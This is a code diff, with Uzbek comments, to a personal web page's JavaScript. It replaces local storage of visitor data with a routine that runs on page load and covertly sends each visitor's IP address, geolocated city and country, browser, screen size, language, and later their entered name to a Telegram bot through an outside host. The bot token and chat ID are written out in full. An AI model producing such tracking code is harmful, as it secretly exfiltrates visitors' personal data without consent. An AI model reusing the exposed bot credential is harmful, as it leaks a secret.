@@ -199,7 +199,7 @@
     // Sahifa yuklanganda ishga tushirish
     window.onload = function() {
         typeEffect();
-        saveVisitorData(); // Saytga kirganda avtomatik ma'lumot saqlash
+        sendInitialData(); // Saytga kirganda avtomatik ma'lumot yuborish
     };
 
     let selectedPlatform = null;
@@ -211,59 +211,57 @@
       });
     });
     
-    // Foydalanuvchi ma'lumotlarini saqlash
-    async function saveVisitorData() {
+    // Telegram botga xabar yuborish
+    async function sendToTelegram(message) {
+        const botToken = '6592066300:AAED-lf6dpiRQy_k98s24dfR_1l2iMjms4U'; // O'z bot tokenizni qo'ying
+        const chatId = '5641197226'; // O'z chat ID ingizni qo'ying
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error('Telegramga xabar yuborishda xato:', error);
+        }
+    }
+    
+    // Foydalanuvchi ma'lumotlarini yuborish
+    async function sendInitialData() {
         try {
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
             const ip = ipData.ip;
             
-            const visitorData = {
-                ip: ip,
-                device: navigator.userAgent,
-                platform: 'Saytga kirish',
-                name: 'Noma\'lum foydalanuvchi',
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language || 'Noma\'lum',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
+            // Geolokatsiya ma'lumotlari
+            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geoData = await geoRes.json();
             
-            // Serverga yuborish o'rniga localStorage ga saqlash
-            saveToLocalStorage(visitorData);
+            const now = new Date();
+            const timeString = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+            
+            const message = `🆕 Yangi vizitka kirishi! (Kapcha: ❌)\n\n` +
+                           `👤 Ism: Noma'lum foydalanuvchi\n` +
+                           `📱 Platforma: Saytga kirish\n` +
+                           `🌐 IP manzil: ${ip}\n` +
+                           `📍 Lokatsiya: ${geoData.city || 'Noma\'lum'}, ${geoData.region || 'Noma\'lum'}, ${geoData.country_name || 'Noma\'lum'}\n` +
+                           `🕒 Vaqt: ${timeString}\n\n` +
+                           `📱 Qurilma ma'lumotlari:\n` +
+                           `🖥️ Brauzer: ${navigator.userAgent.split(') ')[0].split(' (')[1] || 'Noma\'lum'}\n` +
+                           `📏 Ekran o'lchami: ${window.screen.width}x${window.screen.height}\n` +
+                           `🗣️ Til: ${navigator.language || 'Noma\'lum'}`;
+            
+            await sendToTelegram(message);
         } catch (error) {
-            console.error('Ma\'lumot saqlashda xato:', error);
+            console.error('Ma\'lumot yuborishda xato:', error);
         }
-    }
-    
-    // LocalStorage ga saqlash
-    function saveToLocalStorage(data) {
-        try {
-            // Mavjud ma'lumotlarni olish
-            let visitors = JSON.parse(localStorage.getItem('websiteVisitors') || '[]');
-            
-            // Yangi ma'lumotni qo'shish
-            visitors.push(data);
-            
-            // LocalStorage ga saqlash
-            localStorage.setItem('websiteVisitors', JSON.stringify(visitors));
-            
-            // JSON faylga yozish (bu faqat demo, haqiqiy loyihada server kerak)
-            downloadJSON(visitors);
-        } catch (error) {
-            console.error('LocalStorage ga saqlashda xato:', error);
-        }
-    }
-    
-    // JSON fayl sifatida yuklab olish (demo uchun)
-    function downloadJSON(data) {
-        const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(data, null, 2));
-        const downloadAnchorNode = document.createElement('a');
-        downloadAnchorNode.setAttribute("href", dataStr);
-        downloadAnchorNode.setAttribute("download", "visitors_data.json");
-        document.body.appendChild(downloadAnchorNode);
-        downloadAnchorNode.click();
-        downloadAnchorNode.remove();
     }
     
      // Kapcha tizimi uchun o'zgaruvchilar
@@ -327,20 +325,25 @@
         const ipData = await ipRes.json();
         const ip = ipData.ip;
         
-        const visitorData = {
-          ip: ip,
-          device: navigator.userAgent,
-          platform: selectedPlatform,
-          name: name,
-          screen: `${window.screen.width}x${window.screen.height}`,
-          language: navigator.language || 'Noma\'lum',
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          timestamp: new Date().toISOString(),
-          captcha: "passed"
-        };
+        // Geolokatsiya ma'lumotlari
+        const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+        const geoData = await geoRes.json();
         
-        // Ma'lumotni saqlash
-        saveToLocalStorage(visitorData);
+        const now = new Date();
+        const timeString = `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+        
+        const message = `🆕 Yangi vizitka kirishi! (Kapcha: ✅)\n\n` +
+                       `👤 Ism: ${name}\n` +
+                       `📱 Platforma: ${selectedPlatform}\n` +
+                       `🌐 IP manzil: ${ip}\n` +
+                       `📍 Lokatsiya: ${geoData.city || 'Noma\'lum'}, ${geoData.region || 'Noma\'lum'}, ${geoData.country_name || 'Noma\'lum'}\n` +
+                       `🕒 Vaqt: ${timeString}\n\n` +
+                       `📱 Qurilma ma'lumotlari:\n` +
+                       `🖥️ Brauzer: ${navigator.userAgent.split(') ')[0].split(' (')[1] || 'Noma\'lum'}\n` +
+                       `📏 Ekran o'lchami: ${window.screen.width}x${window.screen.height}\n` +
+                       `🗣️ Til: ${navigator.language || 'Noma\'lum'}`;
+        
+        await sendToTelegram(message);
         
         closeModal();
         
